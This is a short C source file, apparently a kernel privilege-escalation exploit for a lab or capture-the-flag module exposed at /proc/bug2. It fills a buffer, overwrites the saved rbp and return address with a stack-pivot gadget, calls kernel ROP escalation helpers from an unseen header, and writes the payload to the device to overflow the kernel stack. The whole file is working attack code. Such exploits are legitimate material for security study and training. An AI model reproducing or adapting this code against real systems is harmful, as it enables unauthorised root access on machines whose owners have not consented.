#include<stdio.h>
#include<stdlib.h>
#include<string.h>
#include<unistd.h>
#include<fcntl.h>
#include<sys/stat.h>
#include<stdint.h>
#include "template.h"

//author : afang
//comment: what a nice day, isn't it?!

void exploit(){

//	printf("go real exploit!");
	char buf[40] = {0};
	memset(buf, 'A' , sizeof(buf));
	*((void**)(buf + 24)) = (void*)target_mmap_addr; //overwrite rbp.
	*((void**)(buf + 32)) = (void*)xchgebp_addr; //Stack exchange to trigger rop.
	prepare_tf();
	kernel_rop_escalate();
	int fd = open("/proc/bug2", O_WRONLY);
	write(fd, buf , sizeof(buf));
}


int main(){

	exploit();
	return 0;
}

